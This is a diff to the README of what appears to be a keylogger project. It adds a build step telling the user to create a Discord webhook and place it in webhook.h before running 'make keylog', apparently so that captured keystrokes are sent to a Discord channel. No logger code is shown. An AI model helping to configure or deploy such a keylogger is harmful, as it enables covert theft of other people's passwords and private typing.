@@ -5,6 +5,8 @@ Heavily based on: [this repo](https://github.com/SCOTPAUL/keylog)
 
 ## How to compile and run
 
+Before compilation you have to get a webhook to channel and put it into webhook.h. [Here's how to get one](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
+
 ```bash
   make keylog
   make clean
